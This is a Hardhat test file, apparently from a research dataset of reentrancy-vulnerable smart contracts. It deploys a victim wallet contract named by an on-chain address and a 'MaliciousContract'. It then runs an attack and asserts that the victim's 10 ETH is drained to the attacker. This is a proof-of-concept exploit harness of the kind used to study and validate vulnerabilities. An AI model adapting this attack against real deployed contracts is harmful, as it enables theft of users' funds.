const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol", function () {  
    let X_WALLET;
    let victim;
    let MaliciousContract;
    let hacker;
    let Log;
    let log;

    beforeEach(async function () {
        // Deploy Log contract
        Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol:Log");
        log = await Log.deploy();
        await log.waitForDeployment();

        // Deploy X_WALLET contract with Log address
        X_WALLET = await ethers.getContractFactory("contracts/dataset/reentrancy/0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol:X_WALLET");
        victim = await X_WALLET.deploy(log.target);
        await victim.waitForDeployment();
        //await x_WALLET.setLog(log.target); // Set Log address after deployment

        // Deploy MaliciousContract with X_WALLET address
        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x93c32845fae42c83a70e5f06214c8433665c2ab5_attack.sol:MaliciousContract");
        hacker = await MaliciousContract.deploy(victim.target);
        
    });

    it("should successfully drain funds through reentrancy attack", async function () {
       // Initial deposit to victim contract
    await victim.Put( 1, {value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(victim.target);
    expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


    // Initial deposit from maliciousContract on victim contract
    await hacker.deposit({value:  ethers.parseEther("5")});

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("10")); 

    //set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [
        hacker.target,
        "0x0",
      ]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    await hacker.attack( ethers.parseEther("5"));

    
    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    const maliciousContractBalance = await ethers.provider.getBalance(hacker.target);

    // Verify the attack was successful
    
    // victim has a drained account
    expect(victimBalance).to.equal(ethers.parseEther("0")); 

    // 5 original balance + 5 from  initial deposit 
    expect(maliciousContractBalance).to.equal(ethers.parseEther("10"));
    
  });
});
  